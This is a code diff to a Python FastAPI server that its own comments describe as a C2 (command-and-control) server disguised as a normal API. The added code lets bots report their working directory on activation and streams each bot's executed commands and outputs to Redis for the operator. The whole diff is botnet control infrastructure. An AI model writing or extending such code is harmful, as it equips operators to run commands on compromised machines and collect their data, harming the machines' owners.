@@ -1,8 +1,9 @@
 from fastapi import Request, APIRouter, status, HTTPException
 from fastapi.responses import Response
-from config import SystemDetails, CommandResult
-from database.bot import create_new_bot
-from database.dbmain import get_connection_pool
+from config import SystemDetails, CommandResult, CurrentDirectory
+from database.bot import create_new_bot, update_location
+from database.dbmain import get_connection_pool, redis_client
+import json
 
 router = APIRouter(prefix="/api/v1") # act as valid api
 
@@ -46,6 +47,18 @@ async def report_status(token: str):
         except Exception as e:
             raise HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, detail=f"Exception {str(e)}")
 
+# bot send the location when activation
+@router.post("/locate/{token}")
+async def locate(token: str, location: CurrentDirectory):
+    try:
+        cur_dir = location.current_directory
+        print(cur_dir)
+        await update_location(token, cur_dir)
+        return Response(status_code=status.HTTP_204_NO_CONTENT)
+    except Exception as e:
+        raise HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, detail=f"Exception {str(e)}")
+
+
 # bot send result of command from c2 server
 @router.post("/result/{token}")
 async def report_result(token: str, cmd_result: CommandResult):
@@ -83,6 +96,14 @@ async def report_result(token: str, cmd_result: CommandResult):
                 """,
                 bot_id, command_id, result
             )
+
+            # push data to Redis
+            data = {
+                "command": command,
+                "result": result
+            }
+            await redis_client.publish(f"bot_results:{token}", json.dumps(data))
+
             return Response(status_code=status.HTTP_200_OK)
 
         except Exception as e:
